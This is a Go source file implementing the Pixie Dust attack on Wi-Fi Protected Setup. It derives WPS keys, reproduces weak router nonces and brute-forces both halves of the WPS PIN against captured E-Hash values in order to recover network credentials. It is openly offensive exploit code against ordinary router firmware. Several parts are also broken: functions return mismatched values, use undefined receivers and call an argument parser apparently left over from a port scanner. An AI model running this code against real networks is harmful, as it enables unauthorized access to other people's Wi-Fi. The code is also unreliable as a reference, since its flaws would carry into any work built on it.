/*
 * Copyright (C) 2025 Oliver R. Calazans Jeronimo
 *
 * This program is free software: you can redistribute it and/or modify
 * it under the terms of the GNU General Public License as published by
 * the Free Software Foundation, either version 3 of the License, or
 * (at your option) any later version.
 *
 * This program is distributed in the hope that it will be useful,
 * but WITHOUT ANY WARRANTY; without even the implied warranty of
 * MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 * GNU General Public License for more details.
 *
 * You should have received a copy of the GNU General Public License
 * along with this program.  If not, see <https://www.gnu.org>.
 */

package pixiedust

import (
	"bytes"
	"crypto/aes"
	"crypto/cipher"
	"crypto/hmac"
	"crypto/sha256"
	"encoding/binary"
	"errors"
	"fmt"
	"math/big"
	"net"
	"time"
)



type pixieDustAttack struct {
	jobs     int
	pke      []byte
	pkr      []byte
	eHash1   []byte
	eHash2   []byte
	authKey  []byte
	eNonce   []byte
	rNonce   []byte
	ebssid   net.HardwareAddr
	modes    []uint8
	m5enc    []byte
	m7enc    []byte
	force    bool
	dhSmall  bool
	start    string
	end      string
	cStart   int
	cEnd     int
}



func newPixieDust(args []string) pixieDustAttack {
	pda := pixieDustAttack{}
	pda.parsePortScanArgs(args)
	return pda
}



func (pda *pixieDustAttack) execute() {
	timeStart := time.Now()
    pda.executeRTL819xCase()
	displayTime(timeStart)
}



func computeDHKey(pkr []byte) ([]byte) {
    eKey := bytes.Repeat([]byte{0x55}, 192)
	
    sharedSecret, err := cryptoModExp(pkr, eKey, dhGroup5Prime)
    if err != nil {
        return nil, err
    }

    dhkey := sha256.Sum256(sharedSecret)
    return dhkey[:], nil
}



func (pda *pixieDustAttack) isModeSelect(mode uint8) bool {
	if len(pda.modes) <= 0 { return false }
	
	for _, m := range pda.modes {
		if mode == m {
			return true
		}
	}

	return false
}



func cryptoModExp(base, power, modulus []byte) ([]byte, error) {
    b := new(big.Int).SetBytes(base)
    e := new(big.Int).SetBytes(power)
    m := new(big.Int).SetBytes(modulus)

    if m.Sign() == 0 || m.Cmp(big.NewInt(1)) == 0 {
        return nil, errors.New("Modulus must be greater than 1")
    }

    result := new(big.Int).Exp(b, e, m)

    return result.Bytes(), nil
}



func keyDerivationFunction(key []byte) (authKey, wrapKey, emsk []byte) {
	var kdfSalt  = []byte("Wi-Fi Easy and Secure Key Derivation")
    totalLen    := wpsAuthkeyLen + wpsKeywrapkeyLen + wpsEmskLen // 80 bytes
    kdkBits     := uint32(totalLen * 8)  // 640 bits
    out         := make([]byte, 0, totalLen)
   
    for i := 1; len(out) < totalLen; i++ {
        h := hmac.New(sha256.New, key)
        binary.Write(h, binary.BigEndian, uint32(i))
        h.Write(kdfSalt)
        binary.Write(h, binary.BigEndian, kdkBits)
        out = append(out, h.Sum(nil)...)
    }

    out = out[:totalLen]
	
	offset  := 0
    authKey  = out[:wpsAuthkeyLen]
	
	offset  += wpsAuthkeyLen
    wrapKey  = out[offset : offset + wpsKeywrapkeyLen]
	
	offset  += wpsKeywrapkeyLen
    emsk     = out[offset:]
    
	return
}



func emptyPinHMAC(authkey []byte) []byte {
    h := hmac.New(sha256.New, authkey)
    return h.Sum(nil)
}



func glibcFastSeed(seed uint32) uint32 {
    var word0 uint32 = 0

    // PWPS_UNERRING:
    // if seed == 0x7fffffff { seed = 0x13f835f3 }
    // if seed == 0xfffffffe { seed = 0x5df735f1 }

    for j := 3; j < 31+3-1; j++ {
        word0 += seed * glibcSeedTbl[j]

        p    := uint64(16807) * uint64(seed)
        p     = (p >> 31) + (p & 0x7fffffff)
        seed  = uint32((p >> 31) + (p & 0x7fffffff))
        // PWPS_UNERRING:
        // if seed == 0x7fffffff { seed = 0 }
    }

    word0 += seed * glibcSeedTbl[33]
    return word0 >> 1
}



func glibcFastNonce(seed uint32) []byte {
    var word0, word1, word2, word3 uint32

    for j := 0; j < 31; j++ {
        word0 += seed * glibcSeedTbl[j+3]
        word1 += seed * glibcSeedTbl[j+2]
        word2 += seed * glibcSeedTbl[j+1]
        word3 += seed * glibcSeedTbl[j+0]

        p    := uint64(16807) * uint64(seed)
        p     = (p >> 31) + (p & 0x7fffffff)
        seed  = uint32((p >> 31) + (p & 0x7fffffff))
    }

    nonce := make([]byte, 16)
    binary.BigEndian.PutUint32(nonce[0:4], word0>>1)
    binary.BigEndian.PutUint32(nonce[4:8], word1>>1)
    binary.BigEndian.PutUint32(nonce[8:12], word2>>1)
    binary.BigEndian.PutUint32(nonce[12:16], word3>>1)
    
	return nonce
}



func decryptEncryptedSettings(wrapKey, encr []byte) ([]byte, error) {
    const blockSize = 16
    if len(encr) < 2*blockSize || len(encr)%blockSize != 0 {
        return nil, errors.New("invalid encrypted data length")
    }

    iv         := encr[:blockSize]
    ciphertext := encr[blockSize:]

    block, err := aes.NewCipher(wrapKey)
    if err != nil {
        return nil, err
    }

    mode      := cipher.NewCBCDecrypter(block, iv)
    plaintext := make([]byte, len(ciphertext))
    mode.CryptBlocks(plaintext, ciphertext)

    padLen := int(plaintext[len(plaintext)-1])
    if padLen == 0 || padLen > len(plaintext) {
        return nil, errors.New("invalid padding")
    }

    for i := len(plaintext) - padLen; i < len(plaintext); i++ {
        if plaintext[i] != byte(padLen) {
            return nil, errors.New("invalid padding")
        }
    }

    return plaintext[:len(plaintext)-padLen], nil
}



type IEVTag struct {
    ID   uint16
    Len  uint16
    Data []byte
}

func findVTag(data []byte, targetID uint16, targetLen int) *IEVTag {
    for i := 0; i+4 <= len(data); {
        id := binary.BigEndian.Uint16(data[i : i+2])
        length := int(binary.BigEndian.Uint16(data[i+2 : i+4]))
        if i+4+length > len(data) {
            return nil
        }
        if id == targetID && (targetLen == 0 || length == targetLen) {
            return &IEVTag{
                ID:   id,
                Len:  uint16(length),
                Data: data[i+4 : i+4+length],
            }
        }
        i += 4 + length
    }
    return nil
}



func crackFirstHalf(authkey, eS1, pke, pkr, eHash1, emptyPsk []byte) (int, []byte, bool, bool) {
    if checkEmptyPinHalf(eS1, authkey, pke, pkr, eHash1, emptyPsk) {
        return 0, emptyPsk, true, true
    }

    for firstHalf := 0; firstHalf < 10000; firstHalf++ {
        pinhalf := fmt.Sprintf("%04d", firstHalf)
        ok, psk := checkPinHalf(authkey, eS1, pke, pkr, eHash1, pinhalf)

		if ok {
            return firstHalf, psk, true, false
        }
    }

    return 0, nil, false, false
}



func checkPinHalf(authkey, es, pke, pkr, ehash []byte, pinhalf string) (bool, []byte) {
    h := hmac.New(sha256.New, authkey)
    h.Write([]byte(pinhalf))
    psk := h.Sum(nil)

    // buffer = es || psk || pke || pkr
    h.Reset()
    h.Write(es)
    h.Write(psk)
    h.Write(pke)
    h.Write(pkr)
    hash := h.Sum(nil)

    return hmac.Equal(hash, ehash), psk
}



func checkEmptyPinHalf(es, authkey, pke, pkr, ehash, emptyPsk []byte) bool {
    h := hmac.New(sha256.New, authkey)
    h.Write(es)
    h.Write(emptyPsk)
    h.Write(pke)
    h.Write(pkr)
    hash := h.Sum(nil)
    return hmac.Equal(hash, ehash)
}



func wpsPinChecksum(pin int) int {
    acc := 0
    for pin > 0 {
        acc += 3 * (pin % 10)
        pin /= 10
        acc += pin % 10
        pin /= 10
    }
    return (10 - acc%10) % 10
}



func wpsPinValid(pin int) bool {
    return wpsPinChecksum(pin/10) == pin%10
}



func uintToCharArray(num, length int) string {
    return fmt.Sprintf("%0*d", length, num)
}



func crackSecondHalf(authkey, eS2, pke, pkr, eHash2, emptyPsk []byte, firstHalf int) (string, []byte, error) {
    if firstHalf == 0 {
        h := hmac.New(sha256.New, authkey)
        h.Write(eS2)
        h.Write(emptyPsk)
        h.Write(pke)
        h.Write(pkr)
        if hmac.Equal(h.Sum(nil), eHash2) {
            return "", emptyPsk, nil
        }
    }

    for sh := 0; sh < 1000; sh++ {
        checksum := wpsPinChecksum(firstHalf*1000 + sh)
        secondHalfValue := sh*10 + checksum
        sPin := uintToCharArray(secondHalfValue, 4)

        ok, psk := checkPinHalf(authkey, eS2, pke, pkr, eHash2, sPin)
        if ok {
            pinFull := firstHalf*10000 + secondHalfValue
            return fmt.Sprintf("%08d", pinFull), psk, nil
        }
    }

    for sh := 0; sh < 10000; sh++ {
        pinFull := firstHalf*10000 + sh
        if wpsPinValid(pinFull) {
            continue
        }
        sPin := uintToCharArray(sh, 4)
        ok, psk := checkPinHalf(authkey, eS2, pke, pkr, eHash2, sPin)
        if ok {
            return fmt.Sprintf("%08d", pinFull), psk, nil
        }
    }

    return "", nil, fmt.Errorf("second half not found")
}



func validateArgs(wps *WPS, start, end *int64) error {
    // 1. Mutuamente exclusivos
    if wps.PKR != nil && wps.SmallDHKeys {
        return errors.New("--dh-small and --pkr are mutually exclusive")
    }
    // 2. Pelo menos um
    if wps.PKR == nil && !wps.SmallDHKeys {
        return errors.New("either --pkr or --dh-small must be specified")
    }
    // 3. Detecção automática
    if wps.PKR != nil && checkSmallDHKeys(wps.PKR) {
        wps.SmallDHKeys = true
    }
    // 4. Obrigatórios
    if wps.PKE == nil || wps.EHash1 == nil || wps.EHash2 == nil || wps.ENonce == nil {
        return errors.New("missing required arguments: --pke, --e-hash1, --e-hash2, --e-nonce")
    }
    if wps.AuthKey == nil {
        if !wps.SmallDHKeys && !bytes.Equal(wps.PKE, wpsRtlPke) {
            return errors.New("--authkey required when not using --dh-small or RTL819x PKE")
        }
        if wps.EBSSID == nil || wps.RNonce == nil {
            return errors.New("--e-bssid and --r-nonce required when --authkey not provided")
        }
    }
    // 5. --force com --start/--end
    if wps.Bruteforce && (start != nil || end != nil) {
        return errors.New("cannot specify --start or --end with --force")
    }
    return nil
}



func checkSmallDHKeys(data []byte) bool {
    if len(data) != wpsPkeyLen {
        return false
    }
    for i := 0; i < wpsPkeyLen - 1; i++ {
        if data[i] != 0 {
            return false
        }
    }
    return data[wpsPkeyLen - 1] == 0x02
}



func getAutoModes(pke, eNonce []byte) []int {
    modes := make([]int, 0, 4)

    if pda.isRTL819xPKE() {
        return []int{rtl819x}
    }

    modes = append(modes, rt)

    if len(eNonce) >= 16 &&
        eNonce[0] < 0x80 && eNonce[4] < 0x80 &&
        eNonce[8] < 0x80 && eNonce[12] < 0x80 {
        modes = append(modes, rtl819x)
        modes = append(modes, eCosSimple)
    } else {
        modes = append(modes, eCosSimple)
    }

    return modes
}



func displayTime(timeStart time.Time) {
	elapsed := time.Since(timeStart).Seconds()
    fmt.Printf("[%%] %.2f seconds in execution\n", elapsed)
}